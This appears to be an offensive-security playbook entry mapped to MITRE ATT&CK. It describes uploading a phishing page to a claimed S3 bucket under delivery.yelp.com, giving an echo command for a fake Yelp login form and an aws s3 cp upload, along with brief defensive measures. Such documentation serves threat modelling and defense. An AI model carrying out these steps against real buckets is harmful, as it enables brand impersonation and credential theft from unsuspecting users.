---
id: uuid-2
tags:
  - aws-s3
  - file-upload
  - malicious-content
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/aws-s3-cp-upload]]'
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:23.150Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-HTML-to-S3-Bucket

## Summary

This procedure uploads attacker-controlled HTML content to a newly claimed S3 bucket, preparing it for serving phishing or impersonation pages under the target's subdomain.

## Description

After claiming the bucket, the attacker creates and uploads an HTML file containing malicious elements, such as fake Yelp login forms or JavaScript for data exfiltration. The file is set as the index document to load by default. This step assumes public read access is enabled on the bucket objects.

## Requirements

1. Claimed S3 bucket (from previous procedure)
2. AWS CLI configured
3. Local HTML file with malicious content prepared

## Defense

Defensive measures and detection strategies:

- Enable S3 bucket policies to block public uploads and require MFA for changes
- Use AWS Config to monitor unauthorized object uploads
- Scan for anomalous content in S3 via antivirus or content inspection tools

## Objectives

1. Place malicious HTML in the bucket
2. Make content accessible via S3 object URLs
3. Set up for static hosting in the next step

## Instructions

### Step 1: Prepare Malicious HTML

**Context**: Create a simple HTML file mimicking the target site, e.g., with phishing forms.

**Command** (local file creation):
```bash
echo '<html><body><h1>Fake Yelp Delivery</h1><form action="phish-endpoint">...</form></body></html>' > malicious.html
```

> This generates the file locally. Expected output: File created on disk.

### Step 2: Upload to Bucket

**Context**: Copy the file to the S3 bucket, naming it index.html for default serving.

**Command** ([[commands/aws-s3-cp-upload]]):
```bash
aws s3 cp malicious.html s3://delivery.yelp.com/index.html
```

> Uploads the file. Expected output: "upload: malicious.html to s3://delivery.yelp.com/index.html". Verify with `aws s3 ls s3://delivery.yelp.com/`.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/aws-s3-cp-upload]]

## Tools Used


## Tags

- aws-s3
- file-upload
